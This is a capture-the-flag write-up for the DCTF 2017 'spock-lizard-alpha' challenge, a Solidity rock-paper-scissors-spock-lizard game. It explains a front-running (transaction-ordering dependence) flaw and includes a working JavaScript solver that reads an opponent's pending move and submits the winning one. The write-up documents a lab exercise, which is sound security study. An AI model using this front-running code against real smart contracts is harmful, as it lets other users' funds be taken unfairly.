## spock-lizard-alpha

### Description
You have to "play_the_game" and win against our bot. Are you strong enough?

The victim: https://dctf.def.camp/finals-2017-lpmjksalfka/DctfChall.sol
The API: alpha.dctf-f1nals-2017.def.camp
Transaction API: https://dctf.def.camp/finals-2017-lpmjksalfka/sample.html

*PS: I've made a cron to reset blockchain so you won't have to wait too much for minning.*

### Author: 
Andrei

### Stats: 
400 points / 1 solver

### Solution
Based on the challenge description, you receive two APIs with some functionalities such as:
- get_balance: returns the number of ETH a wallet holds
- new_cold_wallet: create a wallet which can be unlocked by a password
- send_money: send eth to other account
- call_contract: call a function from a smart contract
- get_flag: returns the flag if you solved the problem
- get_victim: returns a smart contract address which is supposed to be the target for the game
- play_the_game: a function that spawns a game between a victim smart contract and another player

Looking at the source code of the DctfChall.sol you can see that the smart contract is bassically a game of *rock, paper, scissor, spock, lizard*. It can be played by two players and you can choose one of the 5 options available (from 1 to 5).

The Winner player is decide based on the **getWinner()** function:
```javascript
	function getWinner(uint8 option1, uint8 option2) internal returns (uint8) {
		if(option1 == option2) {
			return 0;
		}

		if(option1 == 0x1) {
			if(option2 == 0x3 || option2 == 0x5) return 1;
			return 2;
		}

		if(option1 == 0x2) {
			if(option2 == 0x1 || option2 == 0x4) return 1;
			return 2;
		}

		if(option1 == 0x3) {
			if(option2 == 0x2 || option2 == 0x5) return 1;
			return 2;
		}

		if(option1 == 0x4) {
			if(option2 == 0x3 || option2 == 0x1) return 1;
			return 2;
		}

		if(option1 == 0x5) {
			if(option2 == 0x4 || option2 == 0x2) return 1;
			return 2;
		}

		return 0;//should never get here
}
```

The goal is to make the **getFlag()** function to answer with *"this guy should receive the reward"* when is being called by the Admin Bot.

``` javascript
function getFlag() 
	onlyIfIsPro
	public
	returns (string)
	{
		return 'this guy should receive the reward';
	}
    
    modifier onlyIfIsPro() {
    	require(solvedHistory[msg.sender] >= 10 && solvedHistory[msg.sender] == triesHistory[msg.sender]);
    	_;
    }
```
As you can see above, this is going to happen only if you win 10 times in a row but never loose a game.

##### The solution
The idea is pretty simple, we can "subscribe" to all transactions being made on the blockchain against a specific address by using the API available in the **sample.html**. 
```javascript

$(document).ready(function() {
	client = io.connect('http://45.76.94.172:8080');

	/* receive transactions based on web3.eth.subscribe('pendingTransactions') */
	client.on('transaction', function(data) {
		console.log('transaction', data); 
	});

	client.on('connect', function() {
		console.log('connected');
		client.emit('listen_for', mytarget);
	});
});
```
Thus, we **can see** what other player/bot sent to the targetted smart contract and come up with an option that can secure each time our victory. The vulnerability is called [Transaction-Ordering Dependence (TOD) / Front Running](https://consensys.github.io/smart-contract-best-practices/known_attacks/#transaction-ordering-dependence-tod-front-running) and is bassically some sort of Race Condition by knowing what the contract would do based on code logics. 

##### The solver
```html

<html>
<head>

<script src="https://cdn.socket.io/socket.io-1.4.5.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<script>
var client;
var myaddress  = '0xPLAYER_ADDRESS';
var mypassword = 'password for players wallet';
var mytarget   = '0xVICTIM_WALLET';

var winners = [
	[0,0,0,0,0,0],
	[0,0,2,1,2,1],
	[0,1,0,2,1,2],
	[0,2,1,0,2,1],
	[0,1,2,1,0,2],
	[0,2,1,2,1,0]
];

//seek for a winner based on the first player's option
function getWinner(option1) {
	for(var i=1;i<=5;i++) {
		if(winners[option1][i] == 2) {
			return i;
		}
	}
	return option1; //shouldn't get there
}

$(document).ready(function() {
	client = io.connect('http://45.76.94.172:8080');

	client.on('transaction', function(data) {
		console.log('transaction', data, data.from, myaddress);
		if(data.from.toLowerCase() != myaddress.toLowerCase() && data.input != '0x' && data.input.indexOf('0xf94e349d') !== -1) {
			var option = data.input.slice(-1);
			if(1 <= option && option <= 5) {
				winner_option = getWinner(option);
				console.log('sending winner option for combination: ', option, winner_option);
				$.post('https://alpha.dctf-f1nals-2017.def.camp/', {
					function:'call_contract',
					abi: '[{"constant":true,"inputs":[],"name":"totalinvested","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"solvedHistory","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"bot","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalplayers","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"minbet","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"triesHistory","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"play","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"player","type":"address"}],"name":"isPlaying","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"reset","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"option","type":"uint8"}],"name":"choose","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"getFlag","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_minbet","type":"uint256"},{"name":"_bot","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]',
					address: mytarget,
					from: myaddress,
					password: mypassword,
					func:'choose',
					params:JSON.stringify([winner_option]),
					value:'10000000000000',
					type:'standard',
					gas:'2000000',
					gasPrice:0
				}, function(data) {
					console.log(data);
				});
			}
		} 
	});

	client.on('connect', function() {
		console.log('connected');
		client.emit('listen_for', mytarget);
	});
});
</script>

</head>
<body>
</body>
</html>
```
